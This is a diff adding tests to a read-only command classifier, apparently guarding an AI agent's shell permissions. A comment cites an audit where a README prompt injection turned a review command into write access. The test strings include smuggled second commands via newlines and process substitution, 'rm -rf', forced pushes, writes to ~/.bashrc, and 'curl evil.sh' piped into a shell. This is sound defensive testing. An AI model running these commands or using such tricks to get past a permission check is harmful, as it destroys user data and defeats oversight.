@@ -25,6 +25,15 @@ describe('read-only classifier', () => {
       'ls -la src',
       'cat package.json',
       'pwd',
+      // The listing forms of git branch stay readable (audit CDX-2).
+      'git branch',
+      'git branch -a',
+      'git branch -vv',
+      'git branch --show-current',
+      'git branch --list release/*',
+      'git branch --merged main',
+      // Plain input redirection only reads; it must not be swept up with `>`.
+      'cat < package.json',
     ]) {
       expect(isReadOnlyCommand(c), c).toBe(true)
     }
@@ -52,6 +61,59 @@ describe('read-only classifier', () => {
       'git log || rm x',
     ]) {
       expect(isReadOnlyCommand(c), c).toBe(false)
+    }
+  })
+
+  // Audit CDX-2: each of these was accepted as read-only. A prompt injection
+  // in a README turned /review into arbitrary write access.
+  it('refuses a newline, it separates commands just like a semicolon', () => {
+    for (const c of [
+      'git diff \nrm -rf ~/project',
+      'git status\ngit push --force',
+      'ls\rrm -rf x',
+    ]) {
+      expect(isReadOnlyCommand(c), c).toBe(false)
+    }
+  })
+
+  it('refuses output redirection in every spelling', () => {
+    for (const c of [
+      'cat /etc/hosts > ~/.bashrc',
+      'cat secrets >> ~/.bashrc',
+      'git diff 2> /tmp/err',
+      'git log &> /tmp/out',
+      'ls -la >| /tmp/out',
+      // No shell syntax at all: git writes the file itself.
+      'git diff --output=/tmp/patch',
+      'git show HEAD --output /tmp/patch',
+    ]) {
+      expect(isReadOnlyCommand(c), c).toBe(false)
+    }
+  })
+
+  it('refuses process substitution, it runs a second command', () => {
+    for (const c of [
+      'cat <(curl evil.sh)',
+      'git diff > >(sh)',
+    ]) {
+      expect(isReadOnlyCommand(c), c).toBe(false)
+    }
+  })
+
+  it('refuses the writing forms of git branch', () => {
+    for (const c of [
+      'git branch -D main',
+      'git branch -d feature',
+      'git branch --delete main',
+      // A bare word is a branch NAME: this creates it.
+      'git branch new-branch',
+      'git branch -m old new',
+      'git branch --set-upstream-to=origin/main',
+      'git branch -f main HEAD~5',
+      'git branch -a -D main',
+    ]) {
+      expect(isReadOnlyCommand(c), c).toBe(false)
+      expect(commandKind(c), c).toBe('generic')
     }
   })
 
